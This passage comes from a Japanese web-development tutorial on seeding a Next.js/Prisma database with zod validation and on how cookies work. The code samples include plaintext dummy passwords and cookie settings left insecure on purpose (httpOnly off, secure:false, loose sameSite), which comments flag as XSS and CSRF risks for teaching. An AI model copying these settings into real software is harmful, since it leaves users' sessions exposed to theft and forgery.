<span id="cb12-25"><a href="#cb12-25"></a>    }<span class="op">,</span></span>
<span id="cb12-26"><a href="#cb12-26"></a>    {</span>
<span id="cb12-27"><a href="#cb12-27"></a>      name<span class="op">:</span> <span class="st">&quot;構文 誤次郎&quot;</span><span class="op">,</span></span>
<span id="cb12-28"><a href="#cb12-28"></a>      password<span class="op">:</span> <span class="st">&quot;password1111&quot;</span><span class="op">,</span></span>
<span id="cb12-29"><a href="#cb12-29"></a>      email<span class="op">:</span> <span class="st">&quot;user01@example.com&quot;</span><span class="op">,</span></span>
<span id="cb12-30"><a href="#cb12-30"></a>      role<span class="op">:</span> Role<span class="op">.</span><span class="at">USER</span><span class="op">,</span></span>
<span id="cb12-31"><a href="#cb12-31"></a>    }<span class="op">,</span></span>
<span id="cb12-32"><a href="#cb12-32"></a>    {</span>
<span id="cb12-33"><a href="#cb12-33"></a>      name<span class="op">:</span> <span class="st">&quot;仕様 曖昧子&quot;</span><span class="op">,</span></span>
<span id="cb12-34"><a href="#cb12-34"></a>      password<span class="op">:</span> <span class="st">&quot;password2222&quot;</span><span class="op">,</span></span>
<span id="cb12-35"><a href="#cb12-35"></a>      email<span class="op">:</span> <span class="st">&quot;user02@example.com&quot;</span><span class="op">,</span></span>
<span id="cb12-36"><a href="#cb12-36"></a>      role<span class="op">:</span> Role<span class="op">.</span><span class="at">USER</span><span class="op">,</span></span>
<span id="cb12-37"><a href="#cb12-37"></a>    }<span class="op">,</span></span>
<span id="cb12-38"><a href="#cb12-38"></a>  ]<span class="op">;</span></span>
<span id="cb12-39"><a href="#cb12-39"></a></span>
<span id="cb12-40"><a href="#cb12-40"></a>  <span class="co">// userSeedSchema を使って UserSeeds のバリデーション</span></span>
<span id="cb12-41"><a href="#cb12-41"></a>  <span class="cf">try</span> {</span>
<span id="cb12-42"><a href="#cb12-42"></a>    <span class="cf">await</span> <span class="bu">Promise</span><span class="op">.</span><span class="fu">all</span>(</span>
<span id="cb12-43"><a href="#cb12-43"></a>      userSeeds<span class="op">.</span><span class="fu">map</span>(<span class="kw">async</span> (userSeed<span class="op">,</span> index) <span class="kw">=&gt;</span> {</span>
<span id="cb12-44"><a href="#cb12-44"></a>        <span class="kw">const</span> result <span class="op">=</span> userSeedSchema<span class="op">.</span><span class="fu">safeParse</span>(userSeed)<span class="op">;</span></span>
<span id="cb12-45"><a href="#cb12-45"></a>        <span class="cf">if</span> (result<span class="op">.</span><span class="at">success</span>) <span class="cf">return</span><span class="op">;</span></span>
<span id="cb12-46"><a href="#cb12-46"></a>        <span class="bu">console</span><span class="op">.</span><span class="fu">error</span>(</span>
<span id="cb12-47"><a href="#cb12-47"></a>          <span class="vs">`Validation error in record </span><span class="sc">${</span>index<span class="sc">}</span><span class="vs">:</span><span class="sc">\n${</span><span class="bu">JSON</span><span class="op">.</span><span class="fu">stringify</span>(userSeed<span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="dv">2</span>)<span class="sc">}</span><span class="vs">`</span><span class="op">,</span></span>
<span id="cb12-48"><a href="#cb12-48"></a>        )<span class="op">;</span></span>
<span id="cb12-49"><a href="#cb12-49"></a>        <span class="bu">console</span><span class="op">.</span><span class="fu">error</span>(<span class="st">&quot;▲▲▲ Validation errors ▲▲▲&quot;</span>)<span class="op">;</span></span>
<span id="cb12-50"><a href="#cb12-50"></a>        <span class="bu">console</span><span class="op">.</span><span class="fu">error</span>(</span>
<span id="cb12-51"><a href="#cb12-51"></a>          <span class="bu">JSON</span><span class="op">.</span><span class="fu">stringify</span>(result<span class="op">.</span><span class="at">error</span><span class="op">.</span><span class="fu">flatten</span>()<span class="op">.</span><span class="at">fieldErrors</span><span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="dv">2</span>)<span class="op">,</span></span>
<span id="cb12-52"><a href="#cb12-52"></a>        )<span class="op">;</span></span>
<span id="cb12-53"><a href="#cb12-53"></a>        <span class="cf">throw</span> <span class="kw">new</span> <span class="bu">Error</span>(<span class="vs">`Validation failed at record </span><span class="sc">${</span>index<span class="sc">}</span><span class="vs">`</span>)<span class="op">;</span></span>
<span id="cb12-54"><a href="#cb12-54"></a>      })<span class="op">,</span></span>
<span id="cb12-55"><a href="#cb12-55"></a>    )<span class="op">;</span></span>
<span id="cb12-56"><a href="#cb12-56"></a>  } <span class="cf">catch</span> (error) {</span>
<span id="cb12-57"><a href="#cb12-57"></a>    <span class="cf">throw</span> error<span class="op">;</span></span>
<span id="cb12-58"><a href="#cb12-58"></a>  }</span></code></pre></div>
      <div class="sourceCode" id="cb13" data-caption="prisma/seed.ts (抜粋)"
      data-startFrom="69"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 68;"><span id="cb13-69"><a href="#cb13-69"></a><span class="co">// ユーザ（user）テーブルにテストデータを挿入</span></span>
<span id="cb13-70"><a href="#cb13-70"></a><span class="cf">await</span> prisma<span class="op">.</span><span class="at">user</span><span class="op">.</span><span class="fu">createMany</span>({</span>
<span id="cb13-71"><a href="#cb13-71"></a>  data<span class="op">:</span> userSeeds<span class="op">.</span><span class="fu">map</span>((userSeed) <span class="kw">=&gt;</span> ({</span>
<span id="cb13-72"><a href="#cb13-72"></a>    id<span class="op">:</span> <span class="fu">uuid</span>()<span class="op">,</span></span>
<span id="cb13-73"><a href="#cb13-73"></a>    name<span class="op">:</span> userSeed<span class="op">.</span><span class="at">name</span><span class="op">,</span></span>
<span id="cb13-74"><a href="#cb13-74"></a>    password<span class="op">:</span> userSeed<span class="op">.</span><span class="at">password</span><span class="op">,</span></span>
<span id="cb13-75"><a href="#cb13-75"></a>    role<span class="op">:</span> userSeed<span class="op">.</span><span class="at">role</span><span class="op">,</span></span>
<span id="cb13-76"><a href="#cb13-76"></a>    email<span class="op">:</span> userSeed<span class="op">.</span><span class="at">email</span><span class="op">,</span></span>
<span id="cb13-77"><a href="#cb13-77"></a>  }))<span class="op">,</span></span>
<span id="cb13-78"><a href="#cb13-78"></a>})<span class="op">;</span></span></code></pre></div>
      <p>例えば、<strong>第17行目</strong> の <code>email: "admin01@example.com",</code> を
      <code>email: "hoge-fuga-piyo",</code> のように <strong>email形式としては不正に値</strong>
      に書き変えて <code>npx prisma db seed</code>
      を実行すると、以下のように例外が発生して<strong>シーディング処理が中断</strong>されます
      (＝<span class="masked">不正な値が DB に投入されることを未然に防いでくれます</span>)。</p>
      <pre><code>Validation error in record 0:
{
  &quot;name&quot;: &quot;高負荷 耐子&quot;,
  &quot;password&quot;: &quot;password1111&quot;,
  &quot;email&quot;: &quot;hoge-fuga-piyo&quot;,
  &quot;role&quot;: &quot;ADMIN&quot;
}
▲▲▲ Validation errors ▲▲▲
{
  &quot;email&quot;: [
    &quot;Invalid email&quot;
  ]
}</code></pre>
      <p>なお、<strong>第41行目</strong>からは、例外処理に加えて <code>Promise.all</code>
      を利用した並列処理をしているので、やや複雑な処理になっています。バリデーションの本体である
      <code>userSeedSchema.safeParse(userSeed)</code>
      については、次のセクションでシンプルな例を用意して解説しています。そちらを参照してください。</p>
      <div class="note type-tips">
      <p><strong>「hoge」「fuga」「piyo」とは</strong></p>
      <p>いまさらですが <code>hoge</code> <code>fuga</code> <code>piyo</code> は、メタ構文変数
      <code>foo</code> <code>bar</code> <code>baz</code> の日本バージョンです。</p>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>プログラミング界隈で登場する <code>foo</code> <code>bar</code> <code>baz</code>
      とは何ですか。</p>
      </blockquote>
      </div>
      <h2 data-number="3.3" id="データのバリデーション-シンプルな例"><span
      class="header-section-number">3.3</span> データのバリデーション (シンプルな例)</h2>
      <p>zod によるバリデーション処理 <code>safeParse()</code> もしくは <code>parse()</code>
      を理解するためのコードを <code>src/app/zod/page.tsx</code> に配置しています。こちらを利用して
      <code>safeParse()</code> の使い方について理解してください。</p>
      <p>ウェブアプリ実行時は <a href="http://localhost:3000/zod">http://localhost:3000/zod</a>
      でアクセスできます。<code>F12</code>
      で開発者ツールを開いて「コンソール」から検証処理（バリデーション処理）の結果について確認してください。</p>
      <div class="sourceCode" id="cb15" data-caption="src/app/zod/page.tsx"><pre
      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript"><span id="cb15-1"><a href="#cb15-1"></a><span class="st">&quot;use client&quot;</span><span class="op">;</span></span>
<span id="cb15-2"><a href="#cb15-2"></a><span class="im">import</span> React <span class="im">from</span> <span class="st">&quot;react&quot;</span><span class="op">;</span></span>
<span id="cb15-3"><a href="#cb15-3"></a><span class="im">import</span> { userSeedSchema } <span class="im">from</span> <span class="st">&quot;@/app/_types/UserSeed&quot;</span><span class="op">;</span></span>
<span id="cb15-4"><a href="#cb15-4"></a><span class="im">import</span> { Role } <span class="im">from</span> <span class="st">&quot;@/app/_types/Role&quot;</span><span class="op">;</span></span>
<span id="cb15-5"><a href="#cb15-5"></a></span>
<span id="cb15-6"><a href="#cb15-6"></a><span class="kw">const</span> Page<span class="op">:</span> React<span class="op">.</span><span class="at">FC</span> <span class="op">=</span> () <span class="kw">=&gt;</span> {</span>
<span id="cb15-7"><a href="#cb15-7"></a>  <span class="co">// 検証対象のデータ01</span></span>
<span id="cb15-8"><a href="#cb15-8"></a>  <span class="kw">const</span> unsafeUserSeed_01 <span class="op">=</span> {</span>
<span id="cb15-9"><a href="#cb15-9"></a>    name<span class="op">:</span> <span class="st">&quot;&quot;</span><span class="op">,</span></span>
<span id="cb15-10"><a href="#cb15-10"></a>    password<span class="op">:</span> <span class="st">&quot;123&quot;</span><span class="op">,</span></span>
<span id="cb15-11"><a href="#cb15-11"></a>    email<span class="op">:</span> <span class="st">&quot;hoge hoge&quot;</span><span class="op">,</span></span>
<span id="cb15-12"><a href="#cb15-12"></a>    role<span class="op">:</span> <span class="st">&quot;Admin&quot;</span><span class="op">,</span></span>
<span id="cb15-13"><a href="#cb15-13"></a>  }<span class="op">;</span></span>
<span id="cb15-14"><a href="#cb15-14"></a></span>
<span id="cb15-15"><a href="#cb15-15"></a>  <span class="co">// 検証対象のデータ02</span></span>
<span id="cb15-16"><a href="#cb15-16"></a>  <span class="kw">const</span> unsafeUserSeed_02 <span class="op">=</span> {</span>
<span id="cb15-17"><a href="#cb15-17"></a>    name<span class="op">:</span> <span class="st">&quot;寝屋川 タヌキ&quot;</span><span class="op">,</span></span>
<span id="cb15-18"><a href="#cb15-18"></a>    password<span class="op">:</span> <span class="st">&quot;12345&quot;</span><span class="op">,</span></span>
<span id="cb15-19"><a href="#cb15-19"></a>    email<span class="op">:</span> <span class="st">&quot;tanuki@example.com&quot;</span><span class="op">,</span></span>
<span id="cb15-20"><a href="#cb15-20"></a>    role<span class="op">:</span> Role<span class="op">.</span><span class="at">ADMIN</span><span class="op">,</span></span>
<span id="cb15-21"><a href="#cb15-21"></a>    age<span class="op">:</span> <span class="dv">8</span><span class="op">,</span> <span class="co">// 余分なプロパティ（フィールド）</span></span>
<span id="cb15-22"><a href="#cb15-22"></a>  }<span class="op">;</span></span>
<span id="cb15-23"><a href="#cb15-23"></a></span>
<span id="cb15-24"><a href="#cb15-24"></a>  <span class="kw">const</span> unsafeUserSeed <span class="op">=</span> unsafeUserSeed_01<span class="op">;</span> <span class="co">// 01 or 02</span></span>
<span id="cb15-25"><a href="#cb15-25"></a></span>
<span id="cb15-26"><a href="#cb15-26"></a>  <span class="co">// 検証 (バリデーション)</span></span>
<span id="cb15-27"><a href="#cb15-27"></a>  <span class="kw">const</span> result <span class="op">=</span> userSeedSchema<span class="op">.</span><span class="fu">safeParse</span>(unsafeUserSeed)<span class="op">;</span></span>
<span id="cb15-28"><a href="#cb15-28"></a>  <span class="cf">if</span> (<span class="op">!</span>result<span class="op">.</span><span class="at">success</span>) {</span>
<span id="cb15-29"><a href="#cb15-29"></a>    <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="st">&quot;▼ Validation NG ▼&quot;</span>)<span class="op">;</span></span>
<span id="cb15-30"><a href="#cb15-30"></a>    <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="bu">JSON</span><span class="op">.</span><span class="fu">stringify</span>(result<span class="op">.</span><span class="at">error</span><span class="op">.</span><span class="fu">flatten</span>()<span class="op">.</span><span class="at">fieldErrors</span><span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="dv">2</span>))<span class="op">;</span></span>
<span id="cb15-31"><a href="#cb15-31"></a>  }</span>
<span id="cb15-32"><a href="#cb15-32"></a>  <span class="kw">const</span> userSeed <span class="op">=</span> result<span class="op">.</span><span class="at">data</span> <span class="op">??</span> <span class="kw">null</span><span class="op">;</span></span>
<span id="cb15-33"><a href="#cb15-33"></a>  <span class="cf">if</span> (userSeed) {</span>
<span id="cb15-34"><a href="#cb15-34"></a>    <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="st">&quot;▼ Validation OK ▼&quot;</span>)<span class="op">;</span></span>
<span id="cb15-35"><a href="#cb15-35"></a>    <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="bu">JSON</span><span class="op">.</span><span class="fu">stringify</span>(userSeed<span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="dv">2</span>))<span class="op">;</span></span>
<span id="cb15-36"><a href="#cb15-36"></a>  }</span>
<span id="cb15-37"><a href="#cb15-37"></a>  <span class="co">// 👆 開発モードでは同じ処理が2回走るためログが重複します（Reactの特性）。</span></span>
<span id="cb15-38"><a href="#cb15-38"></a></span>
<span id="cb15-39"><a href="#cb15-39"></a>  <span class="cf">return</span> (</span>
<span id="cb15-40"><a href="#cb15-40"></a>    <span class="op">&lt;</span>main<span class="op">&gt;</span></span>
<span id="cb15-41"><a href="#cb15-41"></a>      <span class="op">&lt;</span>div className<span class="op">=</span><span class="st">&quot;mb-4 text-2xl font-bold&quot;</span><span class="op">&gt;</span>zod<span class="op">&lt;/</span>div<span class="op">&gt;</span></span>
<span id="cb15-42"><a href="#cb15-42"></a>      <span class="op">&lt;</span>div className<span class="op">=</span><span class="st">&quot;mt-4 text-sm text-slate-600&quot;</span><span class="op">&gt;</span></span>
<span id="cb15-43"><a href="#cb15-43"></a>        <span class="op">&lt;</span>p<span class="op">&gt;</span></span>
<span id="cb15-44"><a href="#cb15-44"></a>          ※</span>
<span id="cb15-45"><a href="#cb15-45"></a>          開発者ツールの「コンソール」から検証結果（バリデーション結果）を確認してください。</span>
<span id="cb15-46"><a href="#cb15-46"></a>        <span class="op">&lt;/</span>p<span class="op">&gt;</span></span>
<span id="cb15-47"><a href="#cb15-47"></a>      <span class="op">&lt;/</span>div<span class="op">&gt;</span></span>
<span id="cb15-48"><a href="#cb15-48"></a>    <span class="op">&lt;/</span>main<span class="op">&gt;</span></span>
<span id="cb15-49"><a href="#cb15-49"></a>  )<span class="op">;</span></span>
<span id="cb15-50"><a href="#cb15-50"></a>}<span class="op">;</span></span>
<span id="cb15-51"><a href="#cb15-51"></a></span>
<span id="cb15-52"><a href="#cb15-52"></a><span class="im">export</span> <span class="im">default</span> Page<span class="op">;</span></span></code></pre></div>
      <h3 data-number="3.3.1" id="演習-2"><span class="header-section-number">3.3.1</span> 演習</h3>
      <p><code>src/app/zod/page.tsx</code> について、以下のことを確認してください。</p>
      <ul>
      <li><strong>第24行目</strong> を変更し、<code>safeParse</code> の戻り値 <code>result</code>
      がどのように変わるかを確認してください。</li>
      <li><code>unsafeUserSeed_02</code> のように「UserSeed型」として余分なプロパティを含んだものを
      <code>safeParse</code> で処理するとどのようになるのか確認してください。
      <ul>
      <li>バリデーションエラーになるのか否か</li>
      <li><code>result.data</code> で取得されるオブジェクトには当該プロパティが残るか否か</li>
      <li>それらの処理を設定変更できるか否か</li>
      </ul></li>
      <li>zod のバリデーション処理に <code>safeParse</code> の他に、<code>parse</code>
      が利用できます。<code>safeParse</code> と <code>parse</code>
      の処理の違いについて調べて理解してください。</li>
      </ul>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>バリエーションライブラリ zod における <code>parse</code> と <code>safeParse</code>
      の違いについて丁寧に解説してください。また、それらのユースケース (使い分け)
      についても教えてください。</p>
      </blockquote>
      <h1 data-number="4" id="cookie-について"><span class="header-section-number">4</span> Cookie
      について</h1>
      <p>Cookie (クッキー) とは、サーバとクライアント (ブラウザ) の間で「<strong>状態
      (ステート)</strong>」を管理するために導入された仕組みになります。この状態管理技術は、1994年頃から導入されており、もともとは
      Netscape 社が開発した独自仕様でした。</p>
      <p>まずはじめに <strong>Cookie が必要となる理由 (＝状態管理が必要となる理由)</strong>
      から確認していきます。</p>
      <h2 data-number="4.1" id="cookie-という仕組みが必要な理由"><span
      class="header-section-number">4.1</span> Cookie という仕組みが必要な理由</h2>
      <p>そもそも「ウェブ」および「HTTP」は、状態管理を想定しないシンプルな
      <strong>ステートレス（Stateless）なシステム</strong>
      として設計されたものでした。ステートレスとは「以前の処理内容」や「通信の結果」を内部状態として記憶せずに、各リクエストに対しては、URIのみに対応して独立してレスポンスを返すというアーキテクチャです。</p>
      <p>つまり、特定のURI (<code>http://hoge-shop/cart</code>)
      に対するリクエストに対しては「誰からのアクセスであっても」「それが何度目のアクセスであっても」「それ以前に、その
      URI でどんな操作をしていても」、<strong>同一のURI
      に対するリクエストには、常に同一のレスポンスを返す</strong>
      というのが、本来的なウェブの動作となります。</p>
      <p>インターネットの黎明期 (1990年代前半)
      は、このステートレスなアーキテクチャで十分な機能を提供できていました。しかし、インターネットの普及するにつれて
      <strong>ステートレスな設計だけでは実現困難なシステム</strong>
      (例えば「オンラインショッピング」など) に対する需要が急速に高まってきました。つまり…</p>
      <ul>
      <li><code>http://hoge-shop/cart</code>
      に対して、Aさんがアクセスしたときと、Bさんがアクセスしたときで異なるレスポンスを返すようにしたい。</li>
      <li>Aさんが以前に <code>http://hoge-shop/cart</code> で操作
      (例えば、カートに商品を追加する操作)
      をしているとき、Aさんから再度アクセスあった際には、その操作を反映した内容のレスポンスを返すようにしたい。</li>
      </ul>
      <p>…といった「<strong>ステートフル</strong>」なシステムの実現に対する需要がでてきました。</p>
      <p>そのようななかで、HTTPの基本的なステートレスな基本特性を維持しつつ、アプリケーションレベルで
      <strong>ステートフルな動作</strong>を可能にする仕組みとして考案・導入されたものが「<strong>Cookie</strong>」となります。</p>
      <ul>
      <li>「ステートレス」の対義語が「ステートフル」となります。</li>
      </ul>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>授業で「ウェブはステートレスなアーキテクチャである」と聞きました。意味が分かりません。そもそもアーキテクチャって何ですか？</p>
      </blockquote>
      <h2 data-number="4.2" id="cookie-の仕組み"><span class="header-section-number">4.2</span>
      Cookie の仕組み</h2>
      <p>Cookie の「<strong>基本的な仕組み</strong>」は、次のようになります。</p>
      <ol type="1">
      <li><strong>【クライアント】</strong>: サーバ（例：<code>http://hoge.com/</code>）に対して
      <strong>HTTP リクエスト</strong> を送信する。</li>
      <li><strong>【サーバ】</strong>: <code>Set-Cookie: session_id=12345;</code>
      のようなヘッダを含む <strong>HTTP レスポンス</strong> をクライアントに返す。</li>
      <li><strong>【クライアント】</strong>: レスポンスヘッダに <code>Set-Cookie</code>
      が含まれていれば、ブラウザは
      Cookie（例：<code>session_id=12345</code>）を対応するドメイン（この場合は
      <code>hoge.com</code>）に紐付けて保存する。</li>
      <li><strong>【クライアント】</strong>:
      以後、そのドメインに対してリクエストを送る際、保存された Cookie をリクエストヘッダに
      <code>Cookie: session_id=12345</code> のように自動付与して送信する。</li>
      <li><strong>【サーバ】</strong>: 受信した <strong>HTTP リクエスト</strong> の Cookie
      ヘッダを読み取り、その内容に応じて処理を分岐し、<strong>HTTP レスポンス</strong> を返す。</li>
      </ol>
      <p>以上のように Cookie は「サーバがレスポンスで Cookie
      を発行する」「クライアントはその後のリクエストに自動的に Cookie
      を含める」ことで、元々のステートレスな性質を補う形で「状態管理」や「ユーザ識別」の仕組みを実現しています。</p>
      <h3 data-number="4.2.1" id="httpレスポンスのヘッダに含まれる-set-cookie-フィールド"><span
      class="header-section-number">4.2.1</span> 「HTTPレスポンス」のヘッダに含まれる
      <code>Set-Cookie</code> フィールド</h3>
      <p>デベロッパツールを使って確認することができます。<code>cart_session_id=947012da...</code>
      につづけて、<strong>いくつかの属性情報</strong> (<code>Path</code> や
      <code>Expires</code>、<code>Max-Age</code>、<code>SameSite</code> など)
      が付加されていることに着目してください。属性については、後ほど解説します。</p>
      <figure>
      <img src="figs/01/cookie-01.png" alt="img" />
      <figcaption aria-hidden="true">img</figcaption>
      </figure>
      <h3 data-number="4.2.2" id="httpリクエストのヘッダに-cookie-フィールド"><span
      class="header-section-number">4.2.2</span> 「HTTPリクエスト」のヘッダに <code>Cookie</code>
      フィールド</h3>
      <p>デベロッパツールを使って確認することができます。先ほど、<code>Set-Cookie</code>
      でセットされた <code>cart_session_id=947012da-3995-4071-8bfe-c4afaa923756</code>
      が送信されていることに着目してください。</p>
      <figure>
      <img src="figs/01/cookie-02.png" alt="img" />
      <figcaption aria-hidden="true">img</figcaption>
      </figure>
      <h2 data-number="4.3" id="ウェブアプリ開発において-cookie-について知っておくべきこと"><span
      class="header-section-number">4.3</span> ウェブアプリ開発において Cookie
      について知っておくべきこと</h2>
      <p>ウェブアプリ開発においては、Cookie に関連して以下のことも把握しておいてください。</p>
      <ul>
      <li>ユーザ操作による通常のウェブナビゲーション（リンクをクリックするなど）においては、Cookie
      は自動で HTTP
      リクエストに付与されます。言い換えれば、ユーザが意識することなく、勝手に送信されています。</li>
      <li>Cookie
      の内容は、ブラウザのデベロッパーツールを使って、<strong>ユーザが内容を参照したり、書き換えたり、消去したりすることができます</strong>。</li>
      <li>Cookie は、ひとつのドメインにつき、約 <span class="masked">4KB</span>
      まで保持することができます（画像や長文を Cookie として保存することはできません）。</li>
      <li>Cookie は、基本的にサーバ側で発行するものですが、<strong>ウェブアプリなどでは JavaScript
      を使ってクライアント側で Cookie
      を設定したり、読み込んだりすることもできます</strong>。ただし、後述する <span
      class="masked">HttpOnly属性</span> が設定されている Cookie については、JavaScript
      から値を参照することはできません。</li>
      <li>JavaScript から <code>fetch</code> 関数などで ウェブAPI にアクセスするときに Cookie
      を含めることができます。
      <ul>
      <li>「HttpOnly属性」がついているとき、Cookie
      の内容を参照することはできませんが、HTTPリクエストの送信に含めることはできます。</li>
      </ul></li>
      </ul>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>サードパーティクッキーとは何ですか。</p>
      </blockquote>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>サードパーティクッキーを利用した「リターゲティング広告」の仕組みについて教えてください。</p>
      </blockquote>
      <h3 data-number="4.3.1" id="デベロッパツールからクッキーを確認-httplocalhost3000news"><span
      class="header-section-number">4.3.1</span> デベロッパツールからクッキーを確認
      (<code>http://localhost:3000/news</code>)</h3>
      <p>ブラウザのデベロッパツール (<code>F12</code>で起動) から Cookie
      の内容を確認することができます。</p>
      <figure>
      <img src="figs/01/news-02.png" alt="img" />
      <figcaption aria-hidden="true">img</figcaption>
      </figure>
      <p>以下のアイコンをクリックすることで <strong>ユーザ操作により Cookie
      が削除できること</strong> を確認してください。削除後、再びサイトにアクセスすると Cookie
      が再設定されることも確認してください。</p>
      <figure>
      <img src="figs/01/cookie-03.png" alt="img" />
      <figcaption aria-hidden="true">img</figcaption>
      </figure>
      <p>Cookie の各フィールドをダブルクリックして <strong>値の編集ができること</strong>
      を確認してください (ユーザにより Cookie の偽装ができることを確認してください)。</p>
      <h3 data-number="4.3.2" id="next.js-のサーバサイドコンポーネントで-cookie-を設定する例"><span
      class="header-section-number">4.3.2</span> Next.js のサーバサイドコンポーネントで Cookie
      を設定する例</h3>
      <p>ショップ (<code>http://localhost:3000/shop</code>) に関連する <strong>ウェブAPI</strong>
      (<code>http://localhost:3000/api/cart</code>) の「GET Method」では、HTTPリクエストのヘッダに
      Cookie フィールドが存在しないときは、Cookie を発行しています。また、Cookie があったときは
      DBから「カート情報」取得して、それをレスポンスしています。</p>
      <p><code>src/app/api/cart/route.ts</code> を参照して、ざっくりと処理を追ってみてください
      (詳しいことは後から確認していきます)。</p>
      <div class="sourceCode" id="cb16"
      data-caption="src/app/api/cart/route.ts (抜粋) ライブラリのインポート" data-startFrom="4"><pre
      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 3;"><span id="cb16-4"><a href="#cb16-4"></a><span class="im">import</span> { cookies } <span class="im">from</span> <span class="st">&quot;next/headers&quot;</span><span class="op">;</span></span></code></pre></div>
      <div class="sourceCode" id="cb17" data-caption="src/app/api/cart/route.ts (抜粋)"
      data-startFrom="10"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 9;"><span id="cb17-10"><a href="#cb17-10"></a><span class="kw">const</span> cKey <span class="op">=</span> <span class="st">&quot;cart_session_id&quot;</span><span class="op">;</span></span></code></pre></div>
      <div class="sourceCode" id="cb18" data-caption="src/app/api/cart/route.ts (抜粋)"
      data-startFrom="19"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 18;"><span id="cb18-19"><a href="#cb18-19"></a>cookieStore<span class="op">.</span><span class="fu">set</span>(cKey<span class="op">,</span> id<span class="op">,</span> {</span>
<span id="cb18-20"><a href="#cb18-20"></a>  path<span class="op">:</span> <span class="st">&quot;/&quot;</span><span class="op">,</span></span>
<span id="cb18-21"><a href="#cb18-21"></a>  maxAge<span class="op">:</span> sessionMaxAge<span class="op">,</span></span>
<span id="cb18-22"><a href="#cb18-22"></a>  <span class="co">// httpOnly: false, // 💀 コメントアウトするとXSS脆弱性</span></span>
<span id="cb18-23"><a href="#cb18-23"></a>  sameSite<span class="op">:</span> <span class="st">&quot;strict&quot;</span><span class="op">,</span> <span class="co">// 💀 &quot;none&quot; にするとCSRF脆弱性</span></span>
<span id="cb18-24"><a href="#cb18-24"></a>  secure<span class="op">:</span> <span class="kw">false</span><span class="op">,</span></span>
<span id="cb18-25"><a href="#cb18-25"></a>})<span class="op">;</span></span></code></pre></div>
      <p>各属性の意味を理解して適切に設定しないと、重大なセキュリティリスクとなるので注意してください。</p>
      <h3 data-number="4.3.3"
      id="next.js-のクライアントサイドコンポーネントで-cookie-を設定する例"><span
      class="header-section-number">4.3.3</span> Next.js のクライアントサイドコンポーネントで Cookie
      を設定する例</h3>
      <p>ニュース (<code>http://localhost:3000/news</code>) では <code>js-cookie</code>
      というライブラリを使って <strong>クライアントサイド</strong> で JavaScript プログラムから
      Cookie の「読取り」と「書込み」をしています。サーバサイドとは異なる方法で Cookie
      を設定している点に注意してください。</p>
      <p><code>src/app/news/page.tsx</code> を参照して、ざっくりと処理を追ってみてください。</p>
      <div class="sourceCode" id="cb19"
      data-caption="src/app/news/page.tsx (抜粋) 「js-cookie」のインポート" data-startFrom="5"><pre
      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 4;"><span id="cb19-5"><a href="#cb19-5"></a><span class="im">import</span> Cookies <span class="im">from</span> <span class="st">&quot;js-cookie&quot;</span><span class="op">;</span></span></code></pre></div>
      <p>👆 Next.js のライブラリではないので <code>npm i js-cookie</code>
      コマンドでインストールする必要があります (プロジェクトをクローンしてきている場合は、最初の
      <code>npm i</code> でインストールされています)。</p>
      <div class="sourceCode" id="cb20" data-caption="src/app/news/page.tsx (抜粋) Cookieの読取り"
      data-startFrom="44"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 43;"><span id="cb20-44"><a href="#cb20-44"></a><span class="kw">const</span> regionStr <span class="op">=</span> Cookies<span class="op">.</span><span class="fu">get</span>(<span class="st">&quot;region&quot;</span>)<span class="op">;</span></span></code></pre></div>
      <p>👆 もし <code>region</code> という名前のCookie が存在しない場合、<code>regionStr</code> は
      <code>undefined</code> になります。</p>
      <div class="sourceCode" id="cb21" data-caption="src/app/news/page.tsx (抜粋) Cookieの書込み"
      data-startFrom="27"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 26;"><span id="cb21-27"><a href="#cb21-27"></a><span class="co">// Cookie をセットする関数の定義</span></span>
<span id="cb21-28"><a href="#cb21-28"></a><span class="kw">const</span> setSessionCookie <span class="op">=</span> <span class="fu">useCallback</span>((region<span class="op">:</span> Region) <span class="kw">=&gt;</span> {</span>
<span id="cb21-29"><a href="#cb21-29"></a>  Cookies<span class="op">.</span><span class="fu">set</span>(<span class="st">&quot;region&quot;</span><span class="op">,</span> region<span class="op">,</span> {</span>
<span id="cb21-30"><a href="#cb21-30"></a>    expires<span class="op">:</span> <span class="dv">7</span><span class="op">,</span> <span class="co">// 有効期限（7日間）</span></span>
<span id="cb21-31"><a href="#cb21-31"></a>    <span class="co">// path: &quot;/api/news&quot;, // 💀 省略すると &quot;/&quot; が設定される</span></span>
<span id="cb21-32"><a href="#cb21-32"></a>    <span class="co">// sameSite: &quot;strict&quot;, // 💀 適切に設定しないとCSRF脆弱性が生じる</span></span>
<span id="cb21-33"><a href="#cb21-33"></a>    secure<span class="op">:</span> <span class="kw">false</span><span class="op">,</span> <span class="co">// 💀 本番環境(HTTPS)では true にすべき</span></span>
<span id="cb21-34"><a href="#cb21-34"></a>  })<span class="op">;</span></span>
<span id="cb21-35"><a href="#cb21-35"></a>  <span class="co">// 👆 セキュアに利用する観点から各設定の意味を調べてみてください</span></span>
<span id="cb21-36"><a href="#cb21-36"></a>}<span class="op">,</span> [])<span class="op">;</span></span></code></pre></div>
      <p>各属性の意味を理解して適切に設定しないと、重大なセキュリティリスクとなるので注意してください。</p>
      <h2 data-number="4.4" id="cookie-の属性設定"><span class="header-section-number">4.4</span>
      Cookie の属性設定</h2>
      <p>個々の Cookie には、次のような「<strong>属性</strong>」を設定することができます。</p>
      <p><strong>Expires属性</strong> :
